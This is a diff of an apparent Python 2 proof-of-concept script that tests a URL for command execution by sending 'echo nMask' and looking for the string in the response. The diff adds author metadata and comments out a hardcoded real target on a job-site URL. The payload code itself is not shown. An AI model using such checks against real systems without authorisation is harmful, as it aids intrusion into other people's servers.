@@ -1,4 +1,10 @@
 #! -*- encoding:utf-8 -*-
+
+__author__="nMask"
+__Blog__="http://thief.one"
+__Date__="20170307"
+
+
 import urllib2
 import sys
 from poster.encode import multipart_encode
@@ -15,7 +21,7 @@ def poc(url,content="echo nMask"):
 
     return body
 
-url="http://job.10086.cn/company/anouncement/showAnouncement.action"
+# url="http://job.10086.cn/company/anouncement/showAnouncement.action"
 url=sys.argv[1]
 body=poc(url)
 if "nMask" in body:
